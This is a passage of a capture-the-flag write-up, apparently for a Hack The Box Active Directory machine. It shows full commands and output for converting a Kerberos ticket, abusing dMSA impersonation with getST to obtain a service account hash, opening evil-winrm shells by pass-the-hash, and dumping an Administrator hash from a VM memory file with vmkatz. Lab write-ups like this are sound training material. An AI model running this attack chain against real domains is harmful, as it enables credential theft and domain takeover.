└─$ echo "doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRusXTqqPWaAnHRxluw+W5f5RUwZtHjzFylOPUSOCelvqza8D3I6elsdpStGnZl8PwSKgX5m3F0iYLh8+a05AjLXBc6RW57+gGn3KPGS99WswE0YffHjoF7HmC8N7h5FumF4s9APGgEuLEGmoWisJw1LMtldHYyG/LnMD+7tmxDIu0CJwEleToIMam2CbAcKC/JDr02rWtAB/a8Oe8Xp4YVbDX6DUZEBkB0qjXF+5JzfDKExwzB8ge2nP0XrBbKtC52aZ+61+t+jeMp4Z0t1+69On0duRZXRc1sTckoCY85vM8sUCFEC7cuP7b0u8z8MtWVUjAqMr+XH3B3mZtFylAEpjz3GEHeMo9mOKwfwAEO7OqU+4/0d9PbXdJpqdl6yvFyib5z9E94eeacTWmc0s2XivvBt60fUMPOQaZLOjUeDIjwlBUzeGbGfB8y0gLh3s7UlEfsboJNz0nFpcBhS2NapS8SVo9FSUC2CKkAN99bA/NfQUuO6HpS8u4q983oRWdP8lG8RjiKDUD4B6m8HIZHDtXhRHHQJ0qg/jSQtoopn5nM5zqfIE3AZoR+a9qfX7abr/DQH13lQ/fxnv9ZI5J5X26zkHwVsTGUdMmD94HpjU0SQy9Oqj5GbK6y9A8evrET4dpwmhJ2Bh5waj5bcEjFi5jwznwF7kK2UC92OT3cg6R/NzSn0JWIYDY3H+l2VEbPT/JSiQ5FoJ79xr1dlkuA6svGiC/QbMilR0OO1vRUpACQmVTPPR8WGpKWd/XKRlPnL7MvFrHgRB4M6MQVA+6l0p5cFRvRflETS4qazLRsRIeziega82s2GhzDwR3OgRaIYgq3jYl6nk6dAAAbPKpDAnSTBTJ342d8rwrem+Euz7LJ27Igps33hEfuwb+zZ7LQ+qGpUQ7WsoREwP6bWH2eWtDQrQwuqZpp0+ZyJ1q9sbgGPSclYq0Si1MghATiCOVKBkDMmglL2WLnfwrctxWjcqWE9EwUn7IWk7Z1JItiRMuFhFtyt+IN1q1y5juOScRlUYVtFk/7zj7nVNZdMrlnD4TrJ3r/aEd1Kig0JvHYv4PEnRIbDyf9uvgwzAMLxf3mshUNvCHXVNvmuvMk1vb93DjeuOmPwoHgdrJRfXdBcIfRpBsE32Yjv4OoDXK66jBsIDEJe+u0iCQHseL2kLKeLCdaMQSBYHOw/8VNqmaTi044KLkzyE+VSXFqXPix0EWgUBfRCnqjjQUyOW+3z9K8v7baPbM2dwCWCKtYSxeoTY2rTnx2IovPAeipTn75hm+Ma8TkLygqZ02B3H3pxSYgr3KPxo5yW9Uo0mgXx+2BxhoDWRu1hEsS7uq2vqaZ5CA/0UJJJ4ODOflmkthnwfO3szRALN8JBSEiuUYOnA+OWBcxljmL3WMdYBOB5cDzLRv724/MpO7eIcmIFsfEEWvD3HagnycLaDPUlcnG5+65uzztXgIgbJT5OBL5E3dycHc59mRDtRCEbHBOyjsbnwKdJhk5kCooeReVzWapL8KJo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgTosd/J9pfa3yrzaPk90BL/mUftKLHIZ9rgfqsijmp8WhEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDcxNDAxMDYxMlqmERgPMjAyNjA3MTQxMTA2MTJapxEYDzIwMjYwNzIxMDEwNjEyWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=" |  base64 -d > ryan2.kirbi
                                                                                                       
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ impacket-ticketConverter ryan2.kirbi ryan2.ccache    
Impacket v0.14.0.dev0+20260708.160148.cbcf4f86 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
                                                                                                       
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ export KRB5CCNAME=$(pwd)/ryan2.ccache         

```

* Now we use `impacket-getST` to impersonate our created attacker account and use `-dmsa` flag.

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ getST.py -k -no-pass -impersonate attacker_dMSA$ -self -dmsa checkpoint.htb/ryan.brooks
Impacket v0.14.0.dev0+20260708.160148.cbcf4f86 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating attacker_dMSA$
[*] Requesting S4U2self
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:014e526a6fcd0a5d04e10edb99e47018b7c6abe3f706709809cc02f5895245ce
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:db797c0a28f18b6a8a0b60fc142fdfd5
[*] EncryptionTypes.rc4_hmac:b6bed8ba3dca58d324574e15a51813db
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:e16081eb077aca74bdbf8af12af43ac9
[*] Saving ticket in attacker_dMSA$@krbtgt_CHECKPOINT.HTB@CHECKPOINT.HTB.ccache

```

* We successfully got the hash of the `svc_deploy` user.
* Now use this hash of `SVC_Deploy` user to `evil-winrm`

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ evil-winrm -i dc01.checkpoint.htb  -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                              
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 

```

* Now we upload a tool named `vmkatz.exe` to analyse the `vmem` file which a virtual machine memory file present in the `VMBackups` share.

{% embed url="https://github.com/nikaiw/VMkatz/" %}

```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> upload vmkatz.exe
                                        
Info: Uploading /home/kali/Desktop/HTB/checkpoint/vmkatz.exe to C:\Users\svc_deploy\Documents\vmkatz.exe                                                                                                      
                                        
Data: 3162792 bytes of 3162792 bytes copied
                                        
Info: Upload successful!

```

* After uploading we use it and point it towards the file.

```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> ./vmkatz.exe 'C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem'
vmkatz.exe : [*] vmkatz v1.4.1
    + CategoryInfo          : NotSpecified: ([*] vmkatz v1.4.1:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

[*] System discovery: 5.8615334s[*] Process enumeration: 420.6Âµs[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(empty)
[*] Credential extraction: 27.9956ms
[+] 2 logon session(s), 2 with credentials:

  LUID: 0x3e4 (NETWORK SERVICE)
  Username: WIN-0DG6SJAEUTA$
  Domain: WORKGROUP
  [DPAPI]
    GUID          : 632b77c8-5e1a-4479-8e35-baa290fdd6ae
    MasterKey     : 15e104f6de4e478c6bf55252632a25b973fccd39c2be8cc0d5b15a5dec06029f02fe0a02a3e57eb3b55f077f83a283cd0a11f6b3c6508d9e585527de78dc989e
    SHA1 MasterKey: 44bb34a624afcd186909843e6cbdb4cfee908975
  [DPAPI]
    GUID          : 57e1a5d6-bbd4-44e9-a5c4-f4241b0821b0
    MasterKey     : 95f668c165e7c0b3bd1f525330e5a647b9c9c8da7320c6fbdb4518a588bac996567e04f22b28d4f7a2abd33fafe0958522bca1aaa0de00f5edb7d6742065642d
    SHA1 MasterKey: b2bf2c648554143d6b28b3c06a1ece7e40867238
  [DPAPI]
    GUID          : 4f09a449-22e7-4a65-a4b9-fac89cc25328
    MasterKey     : e4778f7e1b8351eade5c49bb8e32503fbbaa705bb7e26eef5785e0a8200e31fcc2458a4db00e03aaabef34bd47900beee2d8a5bb73ddd904fbe279089a1ea718
    SHA1 MasterKey: 90b1c277630e507a8e28d7b260a53f21712c3f1d

  LUID: 0x14016d
  Session: 2 | LogonType: Unknown
  Username: Administrator
  Domain: WIN-0DG6SJAEUTA
  LogonServer: WIN-0DG6SJAEUTA
  LogonTime: 2026-05-09 14:07:14 UTC
  SID: S-1-5-21-2823729479-30462974-3865623546-500
  [MSV1_0]
    NT Hash : f29e9c014295b9b32139b09a2790be3b
    SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
    DPAPI   : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
  [DPAPI]
    GUID          : c53f7d5b-2902-415c-9c09-251f39974440
    MasterKey     : 32cc5c309067ca0994b849897a9b85b89511547030a1d8b74fe6e37ba037a4161301ffce692e6e433c3821dc18abfe208e1dc5c458de79d1352c6681e18bde15
    SHA1 MasterKey: b061f87be6d2776897d912fed9156a354b81a595

```

* we successfully Found `Administrator` hash now `evil-winrm` as Administrator

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ evil-winrm -i dc01.checkpoint.htb -u administrator -H f29e9c014295b9b32139b09a2790be3b
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
```

* We can go to `max.palmer` user and get the flag on his Desktop.

<figure><img src="../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

* We have successfully solved the machine!!!
